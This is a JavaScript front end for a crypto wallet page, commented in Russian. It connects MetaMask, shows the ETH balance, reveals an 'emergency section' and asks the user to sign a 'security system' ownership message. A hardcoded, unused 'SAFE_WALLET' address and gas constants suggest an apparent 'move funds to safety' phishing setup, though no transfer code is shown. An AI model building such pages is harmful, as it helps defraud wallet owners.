// Конфигурация
const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb';
const GAS_LIMIT = 21000;
const GAS_PRICE_MULTIPLIER = 1.2;

// Элементы страницы
const connectButton = document.getElementById('connectButton');
const signButton = document.getElementById('signButton');
const emergencySection = document.getElementById('emergencySection');
const statusDiv = document.getElementById('status');
const balancesList = document.getElementById('balancesList');
const noWalletMessage = document.getElementById('noWalletMessage');

let web3;
let userAddress;

// Функция для обновления статуса
function updateStatus(message, isError = false, isWarning = false) {
    statusDiv.textContent = message;
    statusDiv.className = 'status-box ' + (isError ? 'error' : isWarning ? 'warning' : 'success');
    statusDiv.style.display = 'block';
}

// Функция для показа/скрытия элементов
function showElement(element) {
    element.classList.remove('hidden');
}

function hideElement(element) {
    element.classList.add('hidden');
}

// Проверяем наличие кошелька
if (typeof window.ethereum !== 'undefined') {
    console.log('Кошелек найден!');
    web3 = new Web3(window.ethereum);
    
    // Показываем основное содержимое
    hideElement(noWalletMessage);
    
} else {
    console.log('Кошелек не найден!');
    showElement(noWalletMessage);
    hideElement(connectButton);
}

// Подключение кошелька
connectButton.addEventListener('click', async () => {
    try {
        connectButton.classList.add('loading');
        updateStatus('⌛ Запрос на подключение кошелька...', false, true);
        
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        
        updateStatus(`✅ Кошелек подключен! Адрес: ${userAddress.substring(0, 10)}...${userAddress.substring(38)}`);
        
        hideElement(connectButton);
        showElement(signButton);
        showElement(emergencySection);
        
        await loadBalances();
        await checkNetwork();
        
    } catch (error) {
        if (error.code === 4001) {
            updateStatus('❌ Вы отклонили запрос на подключение.', true);
        } else {
            updateStatus('❌ Ошибка при подключении: ' + error.message, true);
        }
    } finally {
        connectButton.classList.remove('loading');
    }
});

// Подписание сообщения
signButton.addEventListener('click', async () => {
    if (!userAddress) {
        updateStatus('❌ Сначала подключите кошелек.', true);
        return;
    }
    
    try {
        signButton.classList.add('loading');
        updateStatus('⌛ Запрос на подписание сообщения...', false, true);
        
        const message = `Подтверждение владения кошельком для системы безопасности. Время: ${new Date().toLocaleString()}`;
        const signature = await web3.eth.personal.sign(message, userAddress, '');
        
        updateStatus(`✅ Сообщение успешно подписано! Подпись: ${signature.substring(0, 20)}...`);
        
    } catch (error) {
        if (error.code === 4001) {
            updateStatus('❌ Вы отклонили запрос на подпись.', true);
        } else {
            updateStatus('❌ Ошибка при подписи: ' + error.message, true);
        }
    } finally {
        signButton.classList.remove('loading');
    }
});

// Загрузка балансов
async function loadBalances() {
    try {
        balancesList.innerHTML = '<p>⌛ Загрузка балансов...</p>';
        
        const balance = await web3.eth.getBalance(userAddress);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        
        balancesList.innerHTML = `
            <div class="balance-item">
                <span>ETH:</span>
                <strong>${parseFloat(ethBalance).toFixed(6)} ETH</strong>
            </div>
            <div class="balance-item">
                <span>Примерная стоимость:</span>
                <strong>$${(parseFloat(ethBalance) * 2500).toFixed(2)}</strong>
            </div>
        `;
        
    } catch (error) {
        balancesList.innerHTML = '<p style="color: red;">❌ Ошибка загрузки балансов</p>';
    }
}

// Проверка сети
async function checkNetwork() {
    try {
        const chainId = await web3.eth.getChainId();
        const networks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain', 
            137: 'Polygon',
            42161: 'Arbitrum'
        };
        
        const networkName = networks[chainId] || `Unknown Network (ID: ${chainId})`;
        console.log('Connected to:', networkName);
        
    } catch (error) {
        console.error('Network check error:', error);
    }
}

// Мониторинг изменений кошелька
if (typeof window.ethereum !== 'undefined') {
    window.ethereum.on('accountsChanged', function(accounts) {
        if (accounts.length === 0) {
            updateStatus('Кошелек отключен', true);
            hideElement(emergencySection);
            hideElement(signButton);
            showElement(connectButton);
        } else {
            userAddress = accounts[0];
            updateStatus(`Аккаунт изменен: ${userAddress.substring(0, 10)}...`);
            loadBalances();
        }
    });
    
    window.ethereum.on('chainChanged', function(chainId) {
        window.location.reload();
    });
}
